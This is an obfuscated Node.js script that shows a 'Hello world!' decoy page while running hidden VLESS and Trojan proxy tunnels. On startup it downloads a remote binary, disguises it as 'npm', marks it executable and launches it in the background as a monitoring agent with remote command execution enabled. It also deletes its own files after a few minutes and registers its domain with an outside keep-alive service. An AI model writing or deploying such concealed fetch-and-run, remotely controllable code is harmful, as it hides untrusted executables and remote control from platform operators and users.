const _0x469a2a=_0x178d;(function(_0xc349fe,_0xef57d8){const _0x158abe=_0x178d,_0x20792c=_0xc349fe();while(!![]){try{const _0x1404ca=-parseInt(_0x158abe(0x1ef))/0x1*(-parseInt(_0x158abe(0x1d5))/0x2)+-parseInt(_0x158abe(0x1e2))/0x3*(parseInt(_0x158abe(0x1e0))/0x4)+parseInt(_0x158abe(0x1a6))/0x5+-parseInt(_0x158abe(0x19d))/0x6+parseInt(_0x158abe(0x205))/0x7+parseInt(_0x158abe(0x1e5))/0x8+-parseInt(_0x158abe(0x1c7))/0x9*(parseInt(_0x158abe(0x1dc))/0xa);if(_0x1404ca===_0xef57d8)break;else _0x20792c['push'](_0x20792c['shift']());}catch(_0x16dc35){_0x20792c['push'](_0x20792c['shift']());}}}(_0x2122,0x8d422));const os=require('os'),http=require(_0x469a2a(0x1cb)),fs=require('fs'),axios=require(_0x469a2a(0x19b)),net=require(_0x469a2a(0x1cc)),path=require('path'),crypto=require(_0x469a2a(0x1c3)),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x469a2a(0x207)][_0x469a2a(0x1c4)]||_0x469a2a(0x1be),NEZHA_SERVER=process[_0x469a2a(0x207)][_0x469a2a(0x1b5)]||'',NEZHA_PORT=process[_0x469a2a(0x207)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x469a2a(0x207)][_0x469a2a(0x1cf)]||'',DOMAIN=process[_0x469a2a(0x207)][_0x469a2a(0x202)]||_0x469a2a(0x199),AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],WSPATH=process[_0x469a2a(0x207)][_0x469a2a(0x1d6)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x469a2a(0x207)][_0x469a2a(0x1c8)]||_0x469a2a(0x1a0),NAME=process[_0x469a2a(0x207)][_0x469a2a(0x1ba)]||_0x469a2a(0x1f2),PORT=process[_0x469a2a(0x207)][_0x469a2a(0x191)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x34daa3=_0x469a2a;try{const _0x52e859=await axios[_0x34daa3(0x1ca)](_0x34daa3(0x1fb)),_0x1c61f5=_0x52e859[_0x34daa3(0x204)];ISP=(_0x1c61f5['country']+'-'+_0x1c61f5[_0x34daa3(0x1fe)])[_0x34daa3(0x1fc)](/ /g,'_');}catch(_0x230ad0){ISP=_0x34daa3(0x1e7);}};GetISP();const httpServer=http[_0x469a2a(0x20a)]((_0x18fb94,_0x7767da)=>{const _0x792d9c=_0x469a2a;if(_0x18fb94[_0x792d9c(0x1df)]==='/'){const _0x5e3b02=path[_0x792d9c(0x1f3)](__dirname,_0x792d9c(0x1ac));fs['readFile'](_0x5e3b02,'utf8',(_0x3dbe59,_0x47e992)=>{const _0x55cf9a=_0x792d9c;if(_0x3dbe59){_0x7767da[_0x55cf9a(0x1f4)](0xc8,{'Content-Type':'text/html'}),_0x7767da[_0x55cf9a(0x1c2)](_0x55cf9a(0x1e6));return;}_0x7767da[_0x55cf9a(0x1f4)](0xc8,{'Content-Type':'text/html'}),_0x7767da['end'](_0x47e992);});return;}else{if(_0x18fb94[_0x792d9c(0x1df)]==='/'+SUB_PATH){const _0x30ba48=_0x792d9c(0x1f5)+UUID+'@'+DOMAIN+_0x792d9c(0x1c1)+DOMAIN+_0x792d9c(0x1f7)+DOMAIN+_0x792d9c(0x203)+WSPATH+'#'+NAME+'-'+ISP,_0x510490=_0x792d9c(0x1e3)+UUID+'@'+DOMAIN+_0x792d9c(0x195)+DOMAIN+_0x792d9c(0x1f7)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x106f93=_0x30ba48+'\x0a'+_0x510490,_0x1022ac=Buffer[_0x792d9c(0x1d7)](_0x106f93)['toString'](_0x792d9c(0x1fa));_0x7767da[_0x792d9c(0x1f4)](0xc8,{'Content-Type':_0x792d9c(0x1fd)}),_0x7767da[_0x792d9c(0x1c2)](_0x1022ac+'\x0a');}else _0x7767da[_0x792d9c(0x1f4)](0x194,{'Content-Type':_0x792d9c(0x1fd)}),_0x7767da[_0x792d9c(0x1c2)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x469a2a(0x1ec))]({'server':httpServer}),uuid=UUID[_0x469a2a(0x1fc)](/-/g,''),DNS_SERVERS=[_0x469a2a(0x1bb),_0x469a2a(0x1ea)];function resolveHost(_0x33c088){return new Promise((_0x2f63d6,_0x3d4f5c)=>{const _0x2465ba=_0x178d;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2465ba(0x1c6)](_0x33c088)){_0x2f63d6(_0x33c088);return;}let _0x2f7476=0x0;function _0x715b68(){const _0x1b57c8=_0x2465ba;if(_0x2f7476>=DNS_SERVERS['length']){_0x3d4f5c(new Error('Failed\x20to\x20resolve\x20'+_0x33c088+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x59ad2d=DNS_SERVERS[_0x2f7476];_0x2f7476++;const _0x499fe7=_0x1b57c8(0x1ad)+encodeURIComponent(_0x33c088)+_0x1b57c8(0x1f6);axios[_0x1b57c8(0x1ca)](_0x499fe7,{'timeout':0x1388,'headers':{'Accept':_0x1b57c8(0x1bd)}})[_0x1b57c8(0x1a2)](_0x5cf4be=>{const _0x2dcc22=_0x1b57c8,_0x1064cf=_0x5cf4be[_0x2dcc22(0x204)];if(_0x1064cf['Status']===0x0&&_0x1064cf['Answer']&&_0x1064cf[_0x2dcc22(0x1ee)][_0x2dcc22(0x19e)]>0x0){const _0x1ccf42=_0x1064cf[_0x2dcc22(0x1ee)][_0x2dcc22(0x1bf)](_0x1cf74f=>_0x1cf74f[_0x2dcc22(0x1e1)]===0x1);if(_0x1ccf42){_0x2f63d6(_0x1ccf42[_0x2dcc22(0x204)]);return;}}_0x715b68();})[_0x1b57c8(0x196)](_0x5cd4cf=>{_0x715b68();});}_0x715b68();});}function handleVlessConnection(_0x967f61,_0x1970a1){const _0x1e4673=_0x469a2a,[_0x166265]=_0x1970a1,_0x1e2e55=_0x1970a1[_0x1e4673(0x19f)](0x1,0x11);if(!_0x1e2e55[_0x1e4673(0x1b8)]((_0x5ec069,_0xe32b4d)=>_0x5ec069==parseInt(uuid[_0x1e4673(0x1b3)](_0xe32b4d*0x2,0x2),0x10)))return![];let _0x58ba16=_0x1970a1[_0x1e4673(0x19f)](0x11,0x12)[_0x1e4673(0x1a9)]()+0x13;const _0x36f81d=_0x1970a1[_0x1e4673(0x19f)](_0x58ba16,_0x58ba16+=0x2)[_0x1e4673(0x192)](0x0),_0x55d742=_0x1970a1[_0x1e4673(0x19f)](_0x58ba16,_0x58ba16+=0x1)[_0x1e4673(0x1a9)](),_0x34d325=_0x55d742==0x1?_0x1970a1['slice'](_0x58ba16,_0x58ba16+=0x4)[_0x1e4673(0x1f3)]('.'):_0x55d742==0x2?new TextDecoder()['decode'](_0x1970a1['slice'](_0x58ba16+0x1,_0x58ba16+=0x1+_0x1970a1[_0x1e4673(0x19f)](_0x58ba16,_0x58ba16+0x1)[_0x1e4673(0x1a9)]())):_0x55d742==0x3?_0x1970a1[_0x1e4673(0x19f)](_0x58ba16,_0x58ba16+=0x10)[_0x1e4673(0x1cd)]((_0x48ae2d,_0x2dfbf4,_0x123a81,_0x3e9721)=>_0x123a81%0x2?_0x48ae2d['concat'](_0x3e9721[_0x1e4673(0x19f)](_0x123a81-0x1,_0x123a81+0x1)):_0x48ae2d,[])['map'](_0x55c589=>_0x55c589[_0x1e4673(0x192)](0x0)[_0x1e4673(0x197)](0x10))[_0x1e4673(0x1f3)](':'):'';_0x967f61['send'](new Uint8Array([_0x166265,0x0]));const _0x402a57=createWebSocketStream(_0x967f61);return resolveHost(_0x34d325)[_0x1e4673(0x1a2)](_0x35ef1c=>{const _0x39ab34=_0x1e4673;net[_0x39ab34(0x1f0)]({'host':_0x35ef1c,'port':_0x36f81d},function(){const _0x13e85b=_0x39ab34;this[_0x13e85b(0x18d)](_0x1970a1[_0x13e85b(0x19f)](_0x58ba16)),_0x402a57['on'](_0x13e85b(0x1b1),()=>{})[_0x13e85b(0x1dd)](this)['on'](_0x13e85b(0x1b1),()=>{})['pipe'](_0x402a57);})['on'](_0x39ab34(0x1b1),()=>{});})[_0x1e4673(0x196)](_0x424cbe=>{const _0x59897f=_0x1e4673;net['connect']({'host':_0x34d325,'port':_0x36f81d},function(){const _0x3bfdec=_0x178d;this['write'](_0x1970a1[_0x3bfdec(0x19f)](_0x58ba16)),_0x402a57['on'](_0x3bfdec(0x1b1),()=>{})[_0x3bfdec(0x1dd)](this)['on'](_0x3bfdec(0x1b1),()=>{})[_0x3bfdec(0x1dd)](_0x402a57);})['on'](_0x59897f(0x1b1),()=>{});}),!![];}function handleTrojanConnection(_0x189d47,_0x391b0c){const _0xb951da=_0x469a2a;try{if(_0x391b0c['length']<0x3a)return![];const _0xc60989=_0x391b0c[_0xb951da(0x19f)](0x0,0x38)['toString'](),_0xd77186=[UUID];let _0x4792b4=null;for(const _0x5b2a08 of _0xd77186){const _0x56febc=crypto[_0xb951da(0x1aa)](_0xb951da(0x200))[_0xb951da(0x1ae)](_0x5b2a08)['digest'](_0xb951da(0x1b7));if(_0x56febc===_0xc60989){_0x4792b4=_0x5b2a08;break;}}if(!_0x4792b4)return![];let _0x1dd48d=0x38;_0x391b0c[_0x1dd48d]===0xd&&_0x391b0c[_0x1dd48d+0x1]===0xa&&(_0x1dd48d+=0x2);const _0x3569af=_0x391b0c[_0x1dd48d];if(_0x3569af!==0x1)return![];_0x1dd48d+=0x1;const _0x2ac7d5=_0x391b0c[_0x1dd48d];_0x1dd48d+=0x1;let _0x4c3db4,_0x4e6a27;if(_0x2ac7d5===0x1)_0x4c3db4=_0x391b0c[_0xb951da(0x19f)](_0x1dd48d,_0x1dd48d+0x4)[_0xb951da(0x1f3)]('.'),_0x1dd48d+=0x4;else{if(_0x2ac7d5===0x3){const _0x24d654=_0x391b0c[_0x1dd48d];_0x1dd48d+=0x1,_0x4c3db4=_0x391b0c[_0xb951da(0x19f)](_0x1dd48d,_0x1dd48d+_0x24d654)['toString'](),_0x1dd48d+=_0x24d654;}else{if(_0x2ac7d5===0x4)_0x4c3db4=_0x391b0c['slice'](_0x1dd48d,_0x1dd48d+0x10)[_0xb951da(0x1cd)]((_0x31e1af,_0x500531,_0x356793,_0x33eabd)=>_0x356793%0x2?_0x31e1af[_0xb951da(0x1ed)](_0x33eabd[_0xb951da(0x19f)](_0x356793-0x1,_0x356793+0x1)):_0x31e1af,[])[_0xb951da(0x1c5)](_0x226f27=>_0x226f27[_0xb951da(0x192)](0x0)['toString'](0x10))[_0xb951da(0x1f3)](':'),_0x1dd48d+=0x10;else return![];}}_0x4e6a27=_0x391b0c['readUInt16BE'](_0x1dd48d),_0x1dd48d+=0x2;_0x1dd48d<_0x391b0c[_0xb951da(0x19e)]&&_0x391b0c[_0x1dd48d]===0xd&&_0x391b0c[_0x1dd48d+0x1]===0xa&&(_0x1dd48d+=0x2);const _0x3d3734=createWebSocketStream(_0x189d47);return resolveHost(_0x4c3db4)[_0xb951da(0x1a2)](_0x3670c0=>{const _0x327186=_0xb951da;net[_0x327186(0x1f0)]({'host':_0x3670c0,'port':_0x4e6a27},function(){const _0x4dc137=_0x327186;_0x1dd48d<_0x391b0c[_0x4dc137(0x19e)]&&this[_0x4dc137(0x18d)](_0x391b0c[_0x4dc137(0x19f)](_0x1dd48d)),_0x3d3734['on']('error',()=>{})[_0x4dc137(0x1dd)](this)['on'](_0x4dc137(0x1b1),()=>{})[_0x4dc137(0x1dd)](_0x3d3734);})['on'](_0x327186(0x1b1),()=>{});})['catch'](_0x541054=>{const _0x3d471b=_0xb951da;net[_0x3d471b(0x1f0)]({'host':_0x4c3db4,'port':_0x4e6a27},function(){const _0x1ff25e=_0x3d471b;_0x1dd48d<_0x391b0c['length']&&this[_0x1ff25e(0x18d)](_0x391b0c[_0x1ff25e(0x19f)](_0x1dd48d)),_0x3d3734['on'](_0x1ff25e(0x1b1),()=>{})[_0x1ff25e(0x1dd)](this)['on'](_0x1ff25e(0x1b1),()=>{})[_0x1ff25e(0x1dd)](_0x3d3734);})['on'](_0x3d471b(0x1b1),()=>{});}),!![];}catch(_0x4ec7ed){return![];}}wss['on']('connection',(_0x1992e2,_0x896e29)=>{const _0xa70ad6=_0x469a2a,_0x1a598f=_0x896e29[_0xa70ad6(0x1df)]||'';_0x1992e2['once'](_0xa70ad6(0x1db),_0x544288=>{const _0x172509=_0xa70ad6;if(_0x544288[_0x172509(0x19e)]>0x11&&_0x544288[0x0]===0x0){const _0x24ba80=_0x544288[_0x172509(0x19f)](0x1,0x11),_0x2aaaec=_0x24ba80['every']((_0x39ebdd,_0x466526)=>_0x39ebdd==parseInt(uuid['substr'](_0x466526*0x2,0x2),0x10));if(_0x2aaaec){!handleVlessConnection(_0x1992e2,_0x544288)&&_0x1992e2[_0x172509(0x1a3)]();return;}}!handleTrojanConnection(_0x1992e2,_0x544288)&&_0x1992e2[_0x172509(0x1a3)]();})['on'](_0xa70ad6(0x1b1),()=>{});});const getDownloadUrl=()=>{const _0x2d22f3=_0x469a2a,_0x4a6e3a=os[_0x2d22f3(0x1de)]();return _0x4a6e3a==='arm'||_0x4a6e3a===_0x2d22f3(0x1f8)||_0x4a6e3a===_0x2d22f3(0x18e)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x2d22f3(0x1c9):!NEZHA_PORT?_0x2d22f3(0x1d3):_0x2d22f3(0x209);},downloadFile=async()=>{const _0x5dfa4e=_0x469a2a;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x205168=getDownloadUrl(),_0x2daa77=await axios({'method':_0x5dfa4e(0x1ca),'url':_0x205168,'responseType':_0x5dfa4e(0x208)}),_0x1eba2a=fs[_0x5dfa4e(0x201)](_0x5dfa4e(0x1b0));return _0x2daa77[_0x5dfa4e(0x204)]['pipe'](_0x1eba2a),new Promise((_0x3032c4,_0x2a5e6c)=>{_0x1eba2a['on']('finish',()=>{const _0x148a5f=_0x178d;console[_0x148a5f(0x1e9)](_0x148a5f(0x1ab)),exec(_0x148a5f(0x1a8),_0x4fed18=>{if(_0x4fed18)_0x2a5e6c(_0x4fed18);_0x3032c4();});}),_0x1eba2a['on']('error',_0x2a5e6c);});}catch(_0x30ea7c){throw _0x30ea7c;}},runnz=async()=>{const _0x46cc4d=_0x469a2a;try{const _0x4c3bc8=execSync(_0x46cc4d(0x1e8),{'encoding':_0x46cc4d(0x18f)});if(_0x4c3bc8[_0x46cc4d(0x1b9)]()!==''){console[_0x46cc4d(0x1e9)](_0x46cc4d(0x19a));return;}}catch(_0x137067){}await downloadFile();let _0xd1b3a6='',_0x24e258=[_0x46cc4d(0x1b6),'8443','2096',_0x46cc4d(0x1af),_0x46cc4d(0x190),_0x46cc4d(0x194)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5cf18a=_0x24e258[_0x46cc4d(0x1c0)](NEZHA_PORT)?_0x46cc4d(0x1ce):'';_0xd1b3a6='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x46cc4d(0x193)+NEZHA_KEY+'\x20'+_0x5cf18a+_0x46cc4d(0x19c);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x47960e=NEZHA_SERVER[_0x46cc4d(0x1c0)](':')?NEZHA_SERVER[_0x46cc4d(0x1bc)](':')[_0x46cc4d(0x1f1)]():'',_0x2eef66=_0x24e258[_0x46cc4d(0x1c0)](_0x47960e)?_0x46cc4d(0x1d9):_0x46cc4d(0x1b2),_0x38050e=_0x46cc4d(0x1a1)+NEZHA_KEY+_0x46cc4d(0x1ff)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x2eef66+_0x46cc4d(0x1d4)+UUID;fs[_0x46cc4d(0x1e4)]('config.yaml',_0x38050e);}_0xd1b3a6=_0x46cc4d(0x206);}else{console['log'](_0x46cc4d(0x1d8));return;}}try{exec(_0xd1b3a6,{'shell':_0x46cc4d(0x1d1)},_0x39aa6e=>{const _0x7f1dd2=_0x46cc4d;if(_0x39aa6e)console[_0x7f1dd2(0x1b1)](_0x7f1dd2(0x198),_0x39aa6e);else console[_0x7f1dd2(0x1e9)](_0x7f1dd2(0x1eb));});}catch(_0x2415cb){console['error']('error:\x20'+_0x2415cb);}};function _0x2122(){const _0x477661=['setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','env','stream','https://amd64.ssss.nyc.mn/agent','createServer','write','aarch64','utf-8','2083','PORT','readUInt16BE','\x20-p\x20','2053',':443?security=tls&sni=','catch','toString','npm\x20running\x20error:','1234.abc.com','npm\x20is\x20already\x20running,\x20skip\x20running...','axios','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','6905826AWtlRR','length','slice','sub','client_secret:\x20','then','close','Server\x20is\x20running\x20on\x20port\x20','https://','4674625pWabNC','config.yaml','chmod\x20+x\x20npm','readUInt8','createHash','npm\x20download\x20successfully','index.html','https://dns.google/resolve?name=','update','2087','npm','error','false','substr','listen','NEZHA_SERVER','443','hex','every','trim','NAME','8.8.4.4','split','application/dns-json','c3ec56f7-750e-4128-95de-24f5bdb4e2d0','find','includes',':443?encryption=none&security=tls&sni=','end','crypto','UUID','map','test','2711187UrjPGy','SUB_PATH','https://arm64.ssss.nyc.mn/agent','get','http','net','reduce','--tls','NEZHA_KEY','unlink','/bin/bash','application/json','https://amd64.ssss.nyc.mn/v1','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','158bYHuIR','WSPATH','from','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','true','Automatic\x20Access\x20Task\x20added\x20successfully','message','20EotDGH','pipe','arch','url','3136792UDlfDu','type','3UQAyCh','trojan://','writeFileSync','8287352QLAiRl','Hello\x20world!','Unknown','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','log','1.1.1.1','npm\x20is\x20running','Server','concat','Answer','12595IBFTiJ','connect','pop','Hug','join','writeHead','vless://','&type=A','&fp=chrome&type=ws&host=','arm64','post','base64','https://speed.cloudflare.com/meta','replace','text/plain','asOrganization','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','sha224','createWriteStream','DOMAIN','&path=%2F','data','1052800PrUMEP'];_0x2122=function(){return _0x477661;};return _0x2122();}async function addAccessTask(){const _0x3a11c7=_0x469a2a;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x544044=_0x3a11c7(0x1a5)+DOMAIN;try{const _0x480f31=await axios[_0x3a11c7(0x1f9)]('https://oooo.serv00.net/add-url',{'url':_0x544044},{'headers':{'Content-Type':_0x3a11c7(0x1d2)}});console[_0x3a11c7(0x1e9)](_0x3a11c7(0x1da));}catch(_0x316768){}}function _0x178d(_0x55c739,_0x223a31){const _0x2122ca=_0x2122();return _0x178d=function(_0x178dd4,_0xec75a){_0x178dd4=_0x178dd4-0x18d;let _0x458d91=_0x2122ca[_0x178dd4];return _0x458d91;},_0x178d(_0x55c739,_0x223a31);}const delFiles=()=>{const _0xb7edb1=_0x469a2a;fs[_0xb7edb1(0x1d0)](_0xb7edb1(0x1b0),()=>{}),fs[_0xb7edb1(0x1d0)](_0xb7edb1(0x1a7),()=>{});};httpServer[_0x469a2a(0x1b4)](PORT,()=>{const _0x14af6a=_0x469a2a;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x14af6a(0x1e9)](_0x14af6a(0x1a4)+PORT);});
